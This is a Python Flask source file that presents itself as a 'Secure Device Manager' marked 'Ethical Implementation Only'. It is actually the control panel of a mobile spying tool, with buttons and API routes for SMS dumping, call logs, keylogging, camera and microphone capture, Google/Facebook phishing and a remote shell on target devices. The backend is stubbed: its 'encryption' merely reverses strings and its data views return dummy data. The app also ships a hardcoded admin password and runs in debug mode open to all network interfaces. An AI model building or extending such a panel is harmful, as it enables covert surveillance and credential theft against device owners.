#!/usr/bin/env python3
# Modern Device Management Dashboard with Enhanced Features
# Ethical Implementation Only

from flask import Flask, render_template, redirect, url_for, request, session, flash, jsonify, render_template_string
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
import secrets
import sqlite3
from datetime import datetime
import os
import json

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# Database setup
def init_db():
    conn = sqlite3.connect('device_management.db')
    c = conn.cursor()
    
    # Create tables if they don't exist
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  username TEXT UNIQUE NOT NULL,
                  password TEXT NOT NULL,
                  last_login TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT UNIQUE NOT NULL,
                  name TEXT,
                  status TEXT,
                  last_seen TEXT,
                  ip_address TEXT)''')
    
    # Add admin user if not exists
    if not c.execute("SELECT 1 FROM users WHERE username='admin'").fetchone():
        hashed_pw = generate_password_hash('securepassword123')
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", 
                 ('admin', hashed_pw))
    
    conn.commit()
    conn.close()

init_db()

# Flask-Login setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

class User(UserMixin):
    def __init__(self, user_id, username):
        self.id = user_id
        self.username = username

@login_manager.user_loader
def load_user(user_id):
    conn = sqlite3.connect('device_management.db')
    c = conn.cursor()
    user = c.execute("SELECT id, username FROM users WHERE id = ?", (user_id,)).fetchone()
    conn.close()
    if user:
        return User(user[0], user[1])
    return None

# ==============================================
# Enhanced Ghost Configuration
# ==============================================
class GhostConfig:
    FEATURE_SETTINGS = {
        'sms_dump': {'node': 'sms_data', 'encrypt': True},
        'call_logs': {'node': 'call_data', 'encrypt': True},
        'file_manager': {'node': 'file_data', 'encrypt': False},
        'app_list': {'node': 'app_data', 'encrypt': False},
        'keylogger': {'node': 'key_logs', 'encrypt': True},
        'toast': {'node': 'toast_cmds', 'encrypt': False},
        'camera': {'node': 'media_data', 'encrypt': False},
        'mic': {'node': 'media_data', 'encrypt': False},
        'device_info': {'node': 'device_data', 'encrypt': False},
        'phishing': {'node': 'phish_data', 'encrypt': True},
        'shell': {'node': 'shell_cmds', 'encrypt': True}
    }

# ==============================================
# Enhanced Phantom Features
# ==============================================
class PhantomOps:
    @staticmethod
    def ghost_encrypt(data):
        """Simple encryption for demo purposes"""
        if isinstance(data, dict):
            data = json.dumps(data)
        return data[::-1]  # Just reverses the string for demo

    @staticmethod
    def ghost_decrypt(data):
        """Simple decryption for demo purposes"""
        if isinstance(data, dict):
            return data
        return data[::-1]  # Reverses back to original

    @staticmethod
    def handle_feature_command(device_id, feature, args=None):
        """Handle all the requested features through a unified interface"""
        if feature not in GhostConfig.FEATURE_SETTINGS:
            return {"status": "error", "message": "Unknown feature"}
            
        config = GhostConfig.FEATURE_SETTINGS[feature]
        cmd_id = f"ft_{secrets.token_hex(4)}"
        payload = {
            "device": device_id,
            "feature": feature,
            "args": args or {},
            "timestamp": datetime.now().isoformat()
        }
        
        if config['encrypt']:
            payload = PhantomOps.ghost_encrypt(payload)
            
        # Store in SQLite instead of Firebase for this implementation
        conn = sqlite3.connect('device_management.db')
        c = conn.cursor()
        c.execute("INSERT INTO devices (device_id, status, last_seen) VALUES (?, ?, ?)",
                 (device_id, "active", datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        return {"status": "success", "cmd_id": cmd_id}

    @staticmethod
    def get_feature_data(feature, device_id=None):
        """Retrieve collected data for specific features"""
        if feature not in GhostConfig.FEATURE_SETTINGS:
            return None
            
        config = GhostConfig.FEATURE_SETTINGS[feature]
        
        # For this implementation, we'll return dummy data
        dummy_data = {
            "status": "success",
            "data": {
                "example": "This would contain actual feature data",
                "device": device_id or "all devices",
                "feature": feature
            }
        }
        
        if config['encrypt']:
            return {k: PhantomOps.ghost_decrypt(v) if isinstance(v, str) else v for k, v in dummy_data.items()}
        return dummy_data

# ==============================================
# Template handling
# ==============================================
def get_template(template_name):
    templates = {
        'index.html': '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Manager Dashboard</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    .gradient-bg {
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    }
    .card-gradient {
      background: linear-gradient(145deg, #1e2a3a 0%, #1a1a2e 100%);
    }
    .glow-text {
      text-shadow: 0 0 8px rgba(0, 249, 255, 0.7);
    }
    .nav-link:hover {
      background: rgba(0, 249, 255, 0.1);
    }
  </style>
</head>
<body class="gradient-bg text-gray-100 min-h-screen">
  <div class="container mx-auto px-4">
    <header class="py-6 border-b border-teal-400/20">
      <div class="flex justify-between items-center">
        <h1 class="text-3xl font-bold glow-text text-teal-400">
          <i class="fas fa-shield-alt mr-2"></i>Secure Device Manager
        </h1>
        <div class="flex items-center space-x-4">
          <span class="text-teal-300">Welcome, {{ username }}</span>
          <a href="{{ url_for('logout') }}" class="px-4 py-2 bg-teal-600 hover:bg-teal-700 rounded-lg transition">
            Logout
          </a>
        </div>
      </div>
    </header>

    <nav class="flex space-x-1 my-6 p-2 bg-gray-900/50 rounded-lg">
      <a href="{{ url_for('index') }}" class="nav-link px-4 py-2 rounded-lg hover:text-teal-400 transition">
        <i class="fas fa-tachometer-alt mr-2"></i>Dashboard
      </a>
      <a href="{{ url_for('devices') }}" class="nav-link px-4 py-2 rounded-lg hover:text-teal-400 transition">
        <i class="fas fa-mobile-alt mr-2"></i>Devices
      </a>
      <a href="{{ url_for('phantom_control') }}" class="nav-link px-4 py-2 rounded-lg hover:text-teal-400 transition">
        <i class="fas fa-ghost mr-2"></i>Advanced Controls
      </a>
      <a href="#" class="nav-link px-4 py-2 rounded-lg hover:text-teal-400 transition">
        <i class="fas fa-cog mr-2"></i>Settings
      </a>
    </nav>

    <main>
      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
        <div class="card-gradient p-6 rounded-xl shadow-lg border border-teal-400/20">
          <div class="flex justify-between items-start">
            <div>
              <h3 class="text-gray-400 uppercase text-sm font-semibold">Total Devices</h3>
              <p class="text-4xl font-bold mt-2">{{ total_devices }}</p>
            </div>
            <div class="p-3 bg-teal-400/10 rounded-lg text-teal-400">
              <i class="fas fa-server text-xl"></i>
            </div>
          </div>
        </div>

        <div class="card-gradient p-6 rounded-xl shadow-lg border border-teal-400/20">
          <div class="flex justify-between items-start">
            <div>
              <h3 class="text-gray-400 uppercase text-sm font-semibold">Online Devices</h3>
              <p class="text-4xl font-bold mt-2 text-green-400">{{ online_devices }}</p>
            </div>
            <div class="p-3 bg-green-400/10 rounded-lg text-green-400">
              <i class="fas fa-wifi text-xl"></i>
            </div>
          </div>
        </div>

        <div class="card-gradient p-6 rounded-xl shadow-lg border border-teal-400/20">
          <div class="flex justify-between items-start">
            <div>
              <h3 class="text-gray-400 uppercase text-sm font-semibold">Offline Devices</h3>
              <p class="text-4xl font-bold mt-2 text-red-400">{{ offline_devices }}</p>
            </div>
            <div class="p-3 bg-red-400/10 rounded-lg text-red-400">
              <i class="fas fa-exclamation-triangle text-xl"></i>
            </div>
          </div>
        </div>

        <div class="card-gradient p-6 rounded-xl shadow-lg border border-teal-400/20">
          <div class="flex justify-between items-start">
            <div>
              <h3 class="text-gray-400 uppercase text-sm font-semibold">Active Sessions</h3>
              <p class="text-4xl font-bold mt-2">{{ online_devices }}</p>
            </div>
            <div class="p-3 bg-blue-400/10 rounded-lg text-blue-400">
              <i class="fas fa-user-clock text-xl"></i>
            </div>
          </div>
        </div>
      </div>

      <div class="bg-gray-900/50 p-6 rounded-xl border border-teal-400/20">
        <h2 class="text-xl font-semibold mb-4 flex items-center">
          <i class="fas fa-chart-line mr-2 text-teal-400"></i>
          Device Activity Overview
        </h2>
        <div class="h-64 bg-gray-800/50 rounded-lg flex items-center justify-center">
          <p class="text-gray-500">Activity chart would appear here</p>
        </div>
      </div>
    </main>

    <footer class="py-6 mt-8 border-t border-teal-400/20 text-center text-gray-500 text-sm">
      <p>© 2023 Secure Device Manager. Authorized use only.</p>
      <p class="mt-1">All activities are logged and monitored.</p>
    </footer>
  </div>
</body>
</html>
        ''',
        'login.html': '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Login</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
    }
    .login-box {
      background: rgba(15, 23, 42, 0.8);
      backdrop-filter: blur(10px);
    }
    .input-field {
      background: rgba(30, 41, 59, 0.5);
    }
    .glow-effect {
      box-shadow: 0 0 15px rgba(94, 234, 212, 0.5);
    }
    .stars {
      position: absolute;
      background: white;
      border-radius: 50%;
      animation: twinkle var(--duration) infinite ease-in-out;
    }
    @keyframes twinkle {
      0%, 100% { opacity: 0.2; }
      50% { opacity: 1; }
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center relative overflow-hidden">
  <!-- Animated stars background -->
  <div id="stars-container"></div>

  <div class="login-box p-8 rounded-xl border border-teal-400/20 w-full max-w-md z-10 glow-effect">
    <div class="text-center mb-8">
      <i class="fas fa-shield-alt text-5xl text-teal-400 mb-4"></i>
      <h1 class="text-3xl font-bold text-teal-400 mb-2">Secure Access</h1>
      <p class="text-gray-400">Authorized personnel only</p>
    </div>

    {% with messages = get_flashed_messages(with_categories=true) %}
      {% if messages %}
        {% for category, message in messages %}
          <div class="mb-4 p-3 rounded-lg bg-{{ category }}-500/20 text-{{ category }}-300 border border-{{ category }}-500/30">
            {{ message }}
          </div>
        {% endfor %}
      {% endif %}
    {% endwith %}

    <form method="POST" action="{{ url_for('login') }}">
      <div class="mb-4">
        <label class="block text-gray-400 mb-2" for="username">
          <i class="fas fa-user mr-2"></i>Username
        </label>
        <input type="text" id="username" name="username" required
               class="input-field w-full px-4 py-3 rounded-lg border border-gray-700 focus:border-teal-400 focus:outline-none text-white">
      </div>

      <div class="mb-6">
        <label class="block text-gray-400 mb-2" for="password">
          <i class="fas fa-lock mr-2"></i>Password
        </label>
        <input type="password" id="password" name="password" required
               class="input-field w-full px-4 py-3 rounded-lg border border-gray-700 focus:border-teal-400 focus:outline-none text-white">
      </div>

      <button type="submit" class="w-full bg-teal-500 hover:bg-teal-600 text-white font-bold py-3 px-4 rounded-lg transition duration-200">
        <i class="fas fa-sign-in-alt mr-2"></i>Login
      </button>
    </form>
  </div>

  <script>
    // Create animated stars
    const container = document.getElementById('stars-container');
    for (let i = 0; i < 100; i++) {
      const star = document.createElement('div');
      star.classList.add('stars');
      star.style.width = `${Math.random() * 3}px`;
      star.style.height = star.style.width;
      star.style.left = `${Math.random() * 100}vw`;
      star.style.top = `${Math.random() * 100}vh`;
      star.style.setProperty('--duration', `${Math.random() * 3 + 2}s`);
      container.appendChild(star);
    }
  </script>
</body>
</html>
        ''',
        'devices.html': '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Management</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    .gradient-bg {
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    }
    .device-card {
      transition: all 0.3s ease;
    }
    .device-card:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
    }
    .status-online {
      background-color: rgba(52, 211, 153, 0.1);
      border-color: rgba(52, 211, 153, 0.5);
    }
    .status-offline {
      background-color: rgba(248, 113, 113, 0.1);
      border-color: rgba(248, 113, 113, 0.5);
    }
  </style>
</head>
<body class="gradient-bg text-gray-100 min-h-screen">
  <div class="container mx-auto px-4 py-8">
    <header class="flex justify-between items-center mb-8">
      <h1 class="text-2xl font-bold text-teal-400">
        <i class="fas fa-mobile-alt mr-2"></i>Device Management
      </h1>
      <div>
        <a href="{{ url_for('index') }}" class="px-4 py-2 bg-teal-600 hover:bg-teal-700 rounded-lg transition mr-2">
          Dashboard
        </a>
        <a href="{{ url_for('phantom_control') }}" class="px-4 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg transition">
          Advanced Controls
        </a>
      </div>
    </header>

    <div class="bg-gray-900/50 rounded-xl p-6 border border-teal-400/20 mb-8">
      <div class="flex justify-between items-center mb-6">
        <h2 class="text-xl font-semibold">Connected Devices</h2>
        <div class="flex space-x-4">
          <button class="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg transition">
            <i class="fas fa-sync-alt mr-2"></i>Refresh
          </button>
          <button class="px-4 py-2 bg-green-600 hover:bg-green-700 rounded-lg transition">
            <i class="fas fa-plus mr-2"></i>Add Device
          </button>
        </div>
      </div>

      <div class="overflow-x-auto">
        <table class="w-full">
          <thead class="bg-gray-800/50">
            <tr>
              <th class="px-6 py-3 text-left">Device ID</th>
              <th class="px-6 py-3 text-left">Name</th>
              <th class="px-6 py-3 text-left">Status</th>
              <th class="px-6 py-3 text-left">Last Seen</th>
              <th class="px-6 py-3 text-left">IP Address</th>
              <th class="px-6 py-3 text-left">Actions</th>
            </tr>
          </thead>
          <tbody class="divide-y divide-gray-700">
            {% for device in devices %}
            <tr class="hover:bg-gray-800/30 transition">
              <td class="px-6 py-4">{{ device[1] }}</td>
              <td class="px-6 py-4">{{ device[2] or 'N/A' }}</td>
              <td class="px-6 py-4">
                <span class="px-3 py-1 rounded-full text-sm font-medium 
                  {% if device[3] == 'online' %}bg-green-900/50 text-green-400
                  {% else %}bg-red-900/50 text-red-400{% endif %}">
                  {{ device[3] }}
                </span>
              </td>
              <td class="px-6 py-4">{{ device[4] or 'Unknown' }}</td>
              <td class="px-6 py-4">{{ device[5] or 'N/A' }}</td>
              <td class="px-6 py-4">
                <button class="px-3 py-1 bg-blue-600 hover:bg-blue-700 rounded mr-2">
                  <i class="fas fa-eye"></i>
                </button>
                <button class="px-3 py-1 bg-teal-600 hover:bg-teal-700 rounded">
                  <i class="fas fa-cog"></i>
                </button>
              </td>
            </tr>
            {% endfor %}
          </tbody>
        </table>
      </div>
    </div>
  </div>
</body>
</html>
        '''
    }
    return templates.get(template_name)

# ==============================================
# Main Application Routes
# ==============================================
@app.route('/')
@login_required
def index():
    # Get device stats
    conn = sqlite3.connect('device_management.db')
    c = conn.cursor()
    
    total_devices = c.execute("SELECT COUNT(*) FROM devices").fetchone()[0]
    online_devices = c.execute("SELECT COUNT(*) FROM devices WHERE status = 'online'").fetchone()[0]
    offline_devices = total_devices - online_devices
    
    conn.close()
    
    return render_template_string(get_template('index.html'), 
                         total_devices=total_devices,
                         online_devices=online_devices,
                         offline_devices=offline_devices,
                         username=current_user.username)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        conn = sqlite3.connect('device_management.db')
        c = conn.cursor()
        user = c.execute("SELECT id, username, password FROM users WHERE username = ?", 
                        (username,)).fetchone()
        conn.close()
        
        if user and check_password_hash(user[2], password):
            user_obj = User(user[0], user[1])
            login_user(user_obj)
            
            # Update last login
            conn = sqlite3.connect('device_management.db')
            c = conn.cursor()
            c.execute("UPDATE users SET last_login = ? WHERE id = ?", 
                     (datetime.now().isoformat(), user[0]))
            conn.commit()
            conn.close()
            
            flash('Login successful!', 'success')
            return redirect(url_for('index'))
        else:
            flash('Invalid username or password', 'danger')
    
    return render_template_string(get_template('login.html'))

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out.', 'info')
    return redirect(url_for('login'))

@app.route('/devices')
@login_required
def devices():
    conn = sqlite3.connect('device_management.db')
    c = conn.cursor()
    devices = c.execute("SELECT * FROM devices ORDER BY status DESC").fetchall()
    conn.close()
    return render_template_string(get_template('devices.html'), devices=devices)

# ==============================================
# Phantom Feature API Endpoints
# ==============================================
@app.route('/phantom/api/features/<feature>', methods=['POST'])
@login_required
def handle_feature(feature):
    device_id = request.json.get('device')
    args = request.json.get('args', {})
    result = PhantomOps.handle_feature_command(device_id, feature, args)
    return jsonify(result)

@app.route('/phantom/api/features/<feature>/data')
@login_required
def get_feature_data(feature):
    device_id = request.args.get('device')
    data = PhantomOps.get_feature_data(feature, device_id)
    return jsonify(data or {})

# ==============================================
# Phantom Control Panel
# ==============================================
@app.route('/phantom')
@login_required
def phantom_control():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phantom Control Panel</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
        <style>
            body {
                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                color: #fff;
                min-height: 100vh;
            }
            .feature-card {
                transition: all 0.3s;
                cursor: pointer;
                background: rgba(30, 41, 59, 0.5);
                border: 1px solid rgba(94, 234, 212, 0.2);
            }
            .feature-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 20px rgba(0, 249, 255, 0.2);
                border-color: rgba(94, 234, 212, 0.5);
            }
            .emoji-icon { font-size: 2rem; }
            .navbar {
                background: rgba(15, 23, 42, 0.8);
                border-bottom: 1px solid rgba(94, 234, 212, 0.2);
            }
            .card {
                background: rgba(30, 41, 59, 0.5);
                border: 1px solid rgba(94, 234, 212, 0.2);
            }
            .btn-primary {
                background-color: #0ea5e9;
                border-color: #0ea5e9;
            }
        </style>
    </head>
    <body>
        <nav class="navbar navbar-expand-lg navbar-dark mb-4">
            <div class="container">
                <a class="navbar-brand" href="{{ url_for('index') }}">
                    <i class="fas fa-shield-alt"></i> Secure Device Manager
                </a>
                <div class="d-flex">
                    <a href="{{ url_for('devices') }}" class="btn btn-sm btn-outline-light me-2">
                        <i class="fas fa-mobile-alt"></i> Devices
                    </a>
                    <a href="{{ url_for('index') }}" class="btn btn-sm btn-outline-light">
                        <i class="fas fa-tachometer-alt"></i> Dashboard
                    </a>
                </div>
            </div>
        </nav>

        <div class="container">
            <h2 class="mb-4 text-teal-400"><i class="fas fa-ghost me-2"></i>Phantom Control Panel</h2>
            
            <div class="alert alert-info">
                <i class="fas fa-info-circle me-2"></i> 
                This panel provides advanced device management features for authorized personnel only.
            </div>
            
            <!-- Feature Grid -->
            <div class="row row-cols-1 row-cols-md-3 g-4 mt-2">
                <!-- SMS Dumping -->
                <div class="col">
                    <div class="card feature-card h-100" onclick="sendFeatureCommand('sms_dump')">
                        <div class="card-body text-center">
                            <div class="emoji-icon">📨</div>
                            <h5>SMS Dumping</h5>
                            <button class="btn btn-sm btn-outline-primary mt-2" 
                                    onclick="event.stopPropagation(); getFeatureData('sms_dump')">
                                View Data
                            </button>
                        </div>
                    </div>
                </div>
                
                <!-- Call Logs -->
                <div class="col">
                    <div class="card feature-card h-100" onclick="sendFeatureCommand('call_logs')">
                        <div class="card-body text-center">
                            <div class="emoji-icon">📞</div>
                            <h5>Call Logs</h5>
                            <button class="btn btn-sm btn-outline-primary mt-2"
                                    onclick="event.stopPropagation(); getFeatureData('call_logs')">
                                View Data
                            </button>
                        </div>
                    </div>
                </div>
                
                <!-- File Manager -->
                <div class="col">
                    <div class="card feature-card h-100" onclick="sendFeatureCommand('file_manager', {path: '/'})">
                        <div class="card-body text-center">
                            <div class="emoji-icon">📂</div>
                            <h5>File Manager</h5>
                        </div>
                    </div>
                </div>
                
                <!-- App List -->
                <div class="col">
                    <div class="card feature-card h-100" onclick="sendFeatureCommand('app_list')">
                        <div class="card-body text-center">
                            <div class="emoji-icon">📦</div>
                            <h5>App List</h5>
                        </div>
                    </div>
                </div>
                
                <!-- Keylogger -->
                <div class="col">
                    <div class="card feature-card h-100" onclick="sendFeatureCommand('keylogger', {action: 'start'})">
                        <div class="card-body text-center">
                            <div class="emoji-icon">🔐</div>
                            <h5>Keylogger</h5>
                            <button class="btn btn-sm btn-outline-primary mt-2"
                                    onclick="event.stopPropagation(); getFeatureData('keylogger')">
                                View Logs
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Second Row of Features -->
            <div class="row row-cols-1 row-cols-md-3 g-4 mt-4">
                <!-- Toast Messages -->
                <div class="col">
                    <div class="card feature-card h-100" 
                         onclick="sendFeatureCommand('toast', {message: prompt('Enter toast message:')})">
                        <div class="card-body text-center">
                            <div class="emoji-icon">📢</div>
                            <h5>Toast Messages</h5>
                        </div>
                    </div>
                </div>
                
                <!-- Camera -->
                <div class="col">
                    <div class="card feature-card h-100" onclick="sendFeatureCommand('camera')">
                        <div class="card-body text-center">
                            <div class="emoji-icon">📷</div>
                            <h5>Camera Snapshot</h5>
                        </div>
                    </div>
                </div>
                
                <!-- Microphone -->
                <div class="col">
                    <div class="card feature-card h-100" 
                         onclick="sendFeatureCommand('mic', {duration: prompt('Recording duration (seconds):', 10)})">
                        <div class="card-body text-center">
                            <div class="emoji-icon">🎤</div>
                            <h5>Microphone</h5>
                        </div>
                    </div>
                </div>
                
                <!-- Device Info -->
                <div class="col">
                    <div class="card feature-card h-100" onclick="sendFeatureCommand('device_info')">
                        <div class="card-body text-center">
                            <div class="emoji-icon">📲</div>
                            <h5>Device Info</h5>
                        </div>
                    </div>
                </div>
                
                <!-- Phishing -->
                <div class="col">
                    <div class="card feature-card h-100" 
                         onclick="sendFeatureCommand('phishing', {template: prompt('Template (google/facebook):', 'google')})">
                        <div class="card-body text-center">
                            <div class="emoji-icon">🧠</div>
                            <h5>Phishing</h5>
                            <button class="btn btn-sm btn-outline-primary mt-2"
                                    onclick="event.stopPropagation(); getFeatureData('phishing')">
                                View Data
                            </button>
                        </div>
                    </div>
                </div>
                
                <!-- Shell -->
                <div class="col">
                    <div class="card feature-card h-100" 
                         onclick="sendFeatureCommand('shell', {command: prompt('Enter shell command:')})">
                        <div class="card-body text-center">
                            <div class="emoji-icon">🔧</div>
                            <h5>Remote Shell</h5>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Data Display Area -->
            <div class="card mt-4">
                <div class="card-header bg-dark">
                    <h5><i class="fas fa-database me-2"></i>Feature Data Output</h5>
                </div>
                <div class="card-body bg-dark">
                    <pre id="featureDataOutput" class="text-white">Select a feature to view data...</pre>
                </div>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            function sendFeatureCommand(feature, args) {
                const device = prompt("Enter Device ID:");
                if (!device) return;
                
                fetch(`/phantom/api/features/${feature}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        device: device,
                        args: args || {}
                    })
                })
                .then(r => r.json())
                .then(data => {
                    alert(`Command sent: ${data.cmd_id}`);
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Error sending command');
                });
            }
            
            function getFeatureData(feature) {
                const device = prompt("Enter Device ID (leave blank for all):");
                const url = `/phantom/api/features/${feature}/data${device ? `?device=${device}` : ''}`;
                
                fetch(url)
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('featureDataOutput').innerText = 
                            JSON.stringify(data, null, 2);
                    })
                    .catch(err => {
                        console.error('Error:', err);
                        alert('Error fetching data');
                    });
            }
        </script>
    </body>
    </html>
    ''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)